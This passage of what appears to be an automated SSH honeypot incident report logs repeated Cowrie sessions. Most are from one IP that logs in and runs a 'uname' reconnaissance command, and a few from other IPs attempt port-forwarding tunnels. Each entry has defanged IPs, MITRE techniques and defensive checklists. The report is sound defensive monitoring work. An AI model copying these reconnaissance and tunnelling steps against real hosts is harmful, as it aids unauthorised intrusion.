- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96874ea379d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:20 |
| **Last Seen** | 2026-07-19 10:20 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:20:35` | `cowrie.session.connect` |
| `2026-07-19 10:20:38` | `cowrie.client.version` |
| `2026-07-19 10:20:38` | `cowrie.client.kex` |
| `2026-07-19 10:20:49` | `cowrie.login.success` |
| `2026-07-19 10:20:54` | `cowrie.session.params` |
| `2026-07-19 10:20:54` | `cowrie.command.input` |
| `2026-07-19 10:20:57` | `cowrie.log.closed` |
| `2026-07-19 10:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b68629d69f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:20 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:20:51` | `cowrie.session.connect` |
| `2026-07-19 10:20:54` | `cowrie.client.version` |
| `2026-07-19 10:20:54` | `cowrie.client.kex` |
| `2026-07-19 10:21:02` | `cowrie.login.success` |
| `2026-07-19 10:21:07` | `cowrie.session.params` |
| `2026-07-19 10:21:07` | `cowrie.command.input` |
| `2026-07-19 10:21:09` | `cowrie.log.closed` |
| `2026-07-19 10:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3dd9ea693b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:06` | `cowrie.session.connect` |
| `2026-07-19 10:21:08` | `cowrie.client.version` |
| `2026-07-19 10:21:08` | `cowrie.client.kex` |
| `2026-07-19 10:21:13` | `cowrie.login.success` |
| `2026-07-19 10:21:16` | `cowrie.session.params` |
| `2026-07-19 10:21:16` | `cowrie.command.input` |
| `2026-07-19 10:21:17` | `cowrie.log.closed` |
| `2026-07-19 10:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38cb0e39b7bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:20` | `cowrie.session.connect` |
| `2026-07-19 10:21:21` | `cowrie.client.version` |
| `2026-07-19 10:21:21` | `cowrie.client.kex` |
| `2026-07-19 10:21:27` | `cowrie.login.success` |
| `2026-07-19 10:21:31` | `cowrie.session.params` |
| `2026-07-19 10:21:31` | `cowrie.command.input` |
| `2026-07-19 10:21:33` | `cowrie.log.closed` |
| `2026-07-19 10:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9ad8836304

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:32` | `cowrie.session.connect` |
| `2026-07-19 10:21:34` | `cowrie.client.version` |
| `2026-07-19 10:21:34` | `cowrie.client.kex` |
| `2026-07-19 10:21:40` | `cowrie.login.success` |
| `2026-07-19 10:21:40` | `cowrie.session.params` |
| `2026-07-19 10:21:40` | `cowrie.command.input` |
| `2026-07-19 10:21:41` | `cowrie.log.closed` |
| `2026-07-19 10:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a41f7df7ff

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:42` | `cowrie.session.connect` |
| `2026-07-19 10:21:43` | `cowrie.client.version` |
| `2026-07-19 10:21:43` | `cowrie.client.kex` |
| `2026-07-19 10:21:43` | `cowrie.login.success` |
| `2026-07-19 10:21:43` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf0bf5ebdf1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:47` | `cowrie.session.connect` |
| `2026-07-19 10:21:47` | `cowrie.client.version` |
| `2026-07-19 10:21:47` | `cowrie.client.kex` |
| `2026-07-19 10:21:51` | `cowrie.login.success` |
| `2026-07-19 10:21:55` | `cowrie.session.params` |
| `2026-07-19 10:21:55` | `cowrie.command.input` |
| `2026-07-19 10:21:57` | `cowrie.log.closed` |
| `2026-07-19 10:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5338a080368

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:21 |
| **Last Seen** | 2026-07-19 10:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:21:58` | `cowrie.session.connect` |
| `2026-07-19 10:21:59` | `cowrie.client.version` |
| `2026-07-19 10:21:59` | `cowrie.client.kex` |
| `2026-07-19 10:22:05` | `cowrie.login.success` |
| `2026-07-19 10:22:10` | `cowrie.session.params` |
| `2026-07-19 10:22:10` | `cowrie.command.input` |
| `2026-07-19 10:22:12` | `cowrie.log.closed` |
| `2026-07-19 10:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af9a4bf7c3f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:22 |
| **Last Seen** | 2026-07-19 10:22 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:22:07` | `cowrie.session.connect` |
| `2026-07-19 10:22:10` | `cowrie.client.version` |
| `2026-07-19 10:22:10` | `cowrie.client.kex` |
| `2026-07-19 10:22:21` | `cowrie.login.success` |
| `2026-07-19 10:22:27` | `cowrie.session.params` |
| `2026-07-19 10:22:27` | `cowrie.command.input` |
| `2026-07-19 10:22:32` | `cowrie.log.closed` |
| `2026-07-19 10:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a09c197822f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:22 |
| **Last Seen** | 2026-07-19 10:22 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:22:17` | `cowrie.session.connect` |
| `2026-07-19 10:22:21` | `cowrie.client.version` |
| `2026-07-19 10:22:21` | `cowrie.client.kex` |
| `2026-07-19 10:22:36` | `cowrie.login.success` |
| `2026-07-19 10:22:43` | `cowrie.session.params` |
| `2026-07-19 10:22:43` | `cowrie.command.input` |
| `2026-07-19 10:22:48` | `cowrie.log.closed` |
| `2026-07-19 10:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7961457cdb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:22 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:22:29` | `cowrie.session.connect` |
| `2026-07-19 10:22:34` | `cowrie.client.version` |
| `2026-07-19 10:22:34` | `cowrie.client.kex` |
| `2026-07-19 10:22:49` | `cowrie.login.success` |
| `2026-07-19 10:22:57` | `cowrie.session.params` |
| `2026-07-19 10:22:57` | `cowrie.command.input` |
| `2026-07-19 10:23:02` | `cowrie.log.closed` |
| `2026-07-19 10:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8050aeaf07e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:22 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:22:41` | `cowrie.session.connect` |
| `2026-07-19 10:22:46` | `cowrie.client.version` |
| `2026-07-19 10:22:46` | `cowrie.client.kex` |
| `2026-07-19 10:23:02` | `cowrie.login.success` |
| `2026-07-19 10:23:11` | `cowrie.session.params` |
| `2026-07-19 10:23:11` | `cowrie.command.input` |
| `2026-07-19 10:23:17` | `cowrie.log.closed` |
| `2026-07-19 10:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e9c8a4e6a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:22 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:22:53` | `cowrie.session.connect` |
| `2026-07-19 10:22:57` | `cowrie.client.version` |
| `2026-07-19 10:22:57` | `cowrie.client.kex` |
| `2026-07-19 10:23:17` | `cowrie.login.success` |
| `2026-07-19 10:23:28` | `cowrie.session.params` |
| `2026-07-19 10:23:28` | `cowrie.command.input` |
| `2026-07-19 10:23:31` | `cowrie.log.closed` |
| `2026-07-19 10:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b837b5c6f70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:23 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:23:06` | `cowrie.session.connect` |
| `2026-07-19 10:23:10` | `cowrie.client.version` |
| `2026-07-19 10:23:10` | `cowrie.client.kex` |
| `2026-07-19 10:23:30` | `cowrie.login.success` |
| `2026-07-19 10:23:37` | `cowrie.session.params` |
| `2026-07-19 10:23:37` | `cowrie.command.input` |
| `2026-07-19 10:23:39` | `cowrie.log.closed` |
| `2026-07-19 10:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ba59c5b276

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:23 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:23:12` | `cowrie.session.connect` |
| `2026-07-19 10:23:19` | `cowrie.client.version` |
| `2026-07-19 10:23:19` | `cowrie.client.kex` |
| `2026-07-19 10:23:34` | `cowrie.login.success` |
| `2026-07-19 10:23:40` | `cowrie.session.params` |
| `2026-07-19 10:23:40` | `cowrie.command.input` |
| `2026-07-19 10:23:42` | `cowrie.log.closed` |
| `2026-07-19 10:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb182e5176f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:23 |
| **Last Seen** | 2026-07-19 10:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:23:38` | `cowrie.session.connect` |
| `2026-07-19 10:23:40` | `cowrie.client.version` |
| `2026-07-19 10:23:40` | `cowrie.client.kex` |
| `2026-07-19 10:23:47` | `cowrie.login.success` |
| `2026-07-19 10:23:52` | `cowrie.session.params` |
| `2026-07-19 10:23:52` | `cowrie.command.input` |
| `2026-07-19 10:23:53` | `cowrie.log.closed` |
| `2026-07-19 10:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11bdb26ab935

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:23 |
| **Last Seen** | 2026-07-19 10:24 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:23:49` | `cowrie.session.connect` |
| `2026-07-19 10:23:52` | `cowrie.client.version` |
| `2026-07-19 10:23:52` | `cowrie.client.kex` |
| `2026-07-19 10:23:58` | `cowrie.login.success` |
| `2026-07-19 10:24:03` | `cowrie.session.params` |
| `2026-07-19 10:24:03` | `cowrie.command.input` |
| `2026-07-19 10:24:06` | `cowrie.log.closed` |
| `2026-07-19 10:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142631c674a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:03` | `cowrie.session.connect` |
| `2026-07-19 10:24:05` | `cowrie.client.version` |
| `2026-07-19 10:24:05` | `cowrie.client.kex` |
| `2026-07-19 10:24:14` | `cowrie.login.success` |
| `2026-07-19 10:24:18` | `cowrie.session.params` |
| `2026-07-19 10:24:18` | `cowrie.command.input` |
| `2026-07-19 10:24:21` | `cowrie.log.closed` |
| `2026-07-19 10:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6bad20e20e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:14` | `cowrie.session.connect` |
| `2026-07-19 10:24:15` | `cowrie.client.version` |
| `2026-07-19 10:24:15` | `cowrie.client.kex` |
| `2026-07-19 10:24:23` | `cowrie.login.success` |
| `2026-07-19 10:24:25` | `cowrie.session.params` |
| `2026-07-19 10:24:25` | `cowrie.command.input` |
| `2026-07-19 10:24:26` | `cowrie.log.closed` |
| `2026-07-19 10:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6314febb12ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:24 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:28` | `cowrie.session.connect` |
| `2026-07-19 10:24:29` | `cowrie.client.version` |
| `2026-07-19 10:24:29` | `cowrie.client.kex` |
| `2026-07-19 10:24:35` | `cowrie.login.success` |
| `2026-07-19 10:24:40` | `cowrie.session.params` |
| `2026-07-19 10:24:40` | `cowrie.command.input` |
| `2026-07-19 10:24:42` | `cowrie.log.closed` |
| `2026-07-19 10:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174803eedaf9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:40` | `cowrie.session.connect` |
| `2026-07-19 10:24:42` | `cowrie.client.version` |
| `2026-07-19 10:24:42` | `cowrie.client.kex` |
| `2026-07-19 10:24:50` | `cowrie.login.success` |
| `2026-07-19 10:24:54` | `cowrie.session.params` |
| `2026-07-19 10:24:54` | `cowrie.command.input` |
| `2026-07-19 10:24:56` | `cowrie.log.closed` |
| `2026-07-19 10:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8839e5c627

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:52` | `cowrie.session.connect` |
| `2026-07-19 10:24:54` | `cowrie.client.version` |
| `2026-07-19 10:24:54` | `cowrie.client.kex` |
| `2026-07-19 10:25:03` | `cowrie.login.success` |
| `2026-07-19 10:25:10` | `cowrie.session.params` |
| `2026-07-19 10:25:10` | `cowrie.command.input` |
| `2026-07-19 10:25:13` | `cowrie.log.closed` |
| `2026-07-19 10:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ff1725b52b

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-19 10:24 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:24:57` | `cowrie.session.connect` |
| `2026-07-19 10:24:57` | `cowrie.client.version` |
| `2026-07-19 10:24:57` | `cowrie.client.kex` |
| `2026-07-19 10:24:59` | `cowrie.login.success` |
| `2026-07-19 10:24:59` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a00a4609d0

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:04` | `cowrie.session.connect` |
| `2026-07-19 10:25:05` | `cowrie.client.version` |
| `2026-07-19 10:25:05` | `cowrie.client.kex` |
| `2026-07-19 10:25:08` | `cowrie.login.success` |
| `2026-07-19 10:25:09` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:25:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef3a126d17b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:05` | `cowrie.session.connect` |
| `2026-07-19 10:25:07` | `cowrie.client.version` |
| `2026-07-19 10:25:07` | `cowrie.client.kex` |
| `2026-07-19 10:25:17` | `cowrie.login.success` |
| `2026-07-19 10:25:24` | `cowrie.session.params` |
| `2026-07-19 10:25:24` | `cowrie.command.input` |
| `2026-07-19 10:25:27` | `cowrie.log.closed` |
| `2026-07-19 10:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054be0944453

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:25 |
| **Last Seen** | 2026-07-19 10:25 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:25:22` | `cowrie.session.connect` |
| `2026-07-19 10:25:24` | `cowrie.client.version` |
| `2026-07-19 10:25:24` | `cowrie.client.kex` |
| `2026-07-19 10:25:36` | `cowrie.login.success` |
